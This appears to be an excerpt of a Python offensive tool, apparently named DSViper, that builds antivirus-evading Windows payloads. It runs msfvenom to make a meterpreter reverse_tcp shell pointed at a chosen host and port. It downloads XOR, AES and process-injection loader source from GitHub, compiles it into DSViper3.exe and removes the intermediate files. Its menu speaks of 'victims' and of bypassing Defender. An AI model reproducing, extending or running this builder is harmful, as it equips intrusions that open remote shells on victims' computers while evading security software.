...
def OURFIRSTMETHODXOR():
    ...
    if payloadtype == '1':
       ...
       msfvenom_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
    else:
    ...
    url = "https://raw.githubusercontent.com/Sumanthsec/idontknowwhatthisis/refs/heads/main/code/XORbyp.cpp"
    try:
...
def OURSECONDMETHODAES():
    ...
    url = "https://raw.githubusercontent.com/Sumanthsec/idontknowwhatthisis/refs/heads/main/code/AESbyp.cpp"
    try:
        res = requests.get(url)
...
def OURTHIRDMETHODPRO():
    ...
    url = "https://raw.githubusercontent.com/Sumanthsec/idontknowwhatthisis/refs/heads/main/code/Processinj_XOR.cpp"
    try:
        res = requests.get(url)
    ...
    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper3.exe", "Processinj_XOR.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper3.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"]
    for file in files:
        os.remove(file)        
...
░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ...
    stealth_type = input(f"{WHITE}{BOLD}Select your stealthy stride:\n1.) Moderate\n2.) High\n{RED}{BOLD}3.)This one might mess up your victim's computer but will definitely bypass defender.{WHITE}{BOLD}\n>")
    ...
    if payloadtype == "1":
        ...
        print(f"Invalid payload selection. Please enter 1, 2 or 3.")
    ...
    if stealth_type == "1":
        ...
        print(f"Selected stealth level: Insane.")
        OURTHIRDMETHODPRO()
    else:
        print(f"Invalid stealth level. Please enter 1 or 2")
    
    print(f"{GREEN}{BOLD}[*]Rename the payloads as you wish")
